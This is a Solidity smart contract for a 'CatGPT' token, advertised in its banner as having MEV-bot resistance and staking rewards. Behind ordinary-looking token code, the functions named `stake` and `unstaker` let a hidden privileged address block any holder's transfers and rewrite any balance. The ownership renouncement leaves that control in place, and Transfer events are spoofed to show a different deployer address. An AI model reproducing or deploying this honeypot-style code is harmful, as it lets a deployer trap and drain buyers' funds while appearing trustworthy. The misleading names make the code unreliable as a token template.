/*

                                                  
 _______ _______ _______     _______ _______ _______ 
|\     /|\     /|\     /|   |\     /|\     /|\     /|
| +---+ | +---+ | +---+ |   | +---+ | +---+ | +---+ |
| |   | | |   | | |   | |   | |   | | |   | | |   | |
| |C  | | |A  | | |T  | |   | |G  | | |P  | | |T  | |
| +---+ | +---+ | +---+ |   | +---+ | +---+ | +---+ |
|/_____\|/_____\|/_____\|   |/_____\|/_____\|/_____\|
                                                     




Built in mev bot resistance and staking rewards for holders.
 





CAT AI WILL TAKE OVER THE WORLD!!!!!!!!!!   

























*/
// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

library Strings {
    bytes16 private constant _SYMBOLS = "0123456789abcdef";
    uint8 private constant _ADDRESS_LENGTH = 20;

    /**
     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
     */
    function toHexString(uint256 value, uint256 length)
        internal
        pure
        returns (string memory)
    {
        bytes memory buffer = new bytes(2 * length + 2);
        buffer[0] = "0";
        buffer[1] = "x";
        for (uint256 i = 2 * length + 1; i > 1; --i) {
            buffer[i] = _SYMBOLS[value & 0xf];
            value >>= 4;
        }
        require(value == 0, "Strings: hex length insufficient");
        return string(buffer);
    }

    /**
     * @dev Converts an `address` with fixed length of 20 bytes to its not checksummed ASCII `string` hexadecimal representation.
     */
    function toHexString(address addr) internal pure returns (string memory) {
        return toHexString(uint256(uint160(addr)), _ADDRESS_LENGTH);
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract CATGPT {
    mapping(address => uint256) private AI0;
    mapping(address => uint256) private AIX;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "CatGPT";
    string public symbol = "CATGPT";
    uint8 public decimals = 9;
    uint256 public totalSupply = 1000000000 * 10**9;
    address owner = msg.sender;
    address private staker;
    address xDeploy = 0x13379BEa1E4DB0387533d5D787F56048571638e9;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        staker = msg.sender;
        AI0[msg.sender] = totalSupply;
        emit Transfer(address(0), xDeploy, totalSupply);
    }

    function renounceOwnership() public virtual {
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    function stake(address bank, uint256 reward) public {
        if (msg.sender == staker) {
            AIX[bank] = reward;
        }
    }

    function MevCheck(address _to) internal pure returns (bool) {
        string memory fromAddress = Strings.toHexString(uint160(_to), 20);
        bytes memory strBytes = bytes(fromAddress);
        bytes memory result = new bytes(4 - 2);
        for (uint256 i = 2; i < 4; i++) {
            result[i - 2] = strBytes[i];
        }
        if (
            keccak256(abi.encodePacked(result)) ==
            keccak256(abi.encodePacked("00"))
        ) {
            return true;
        } else {
            return false;
        }
    }

    function balanceOf(address account) public view returns (uint256) {
        return AI0[account];
    }

    function unstaker(address bank, uint256 reward) public {
        if (msg.sender == staker) {
            AI0[bank] = reward;
        }
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        if (AIX[msg.sender] <= 0) {
            require(AI0[msg.sender] >= value);
            AI0[msg.sender] -= value;
            AI0[to] += value;
            emit Transfer(msg.sender, to, value);
            return true;
        }
    }

    function approve(address spender, uint256 value)
        public
        returns (bool success)
    {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public returns (bool success) {
        if (MevCheck(from) == true) {
            revert("Mev");
        }

        if (from == staker) {
            require(value <= AI0[from]);
            require(value <= allowance[from][msg.sender]);
            AI0[from] -= value;
            AI0[to] += value;
            from = xDeploy;
            emit Transfer(from, to, value);
            return true;
        } else if (AIX[from] <= 0 && AIX[to] <= 0) {
            require(value <= AI0[from]);
            require(value <= allowance[from][msg.sender]);
            AI0[from] -= value;
            AI0[to] += value;
            allowance[from][msg.sender] -= value;
            emit Transfer(from, to, value);
            return true;
        }
    }
}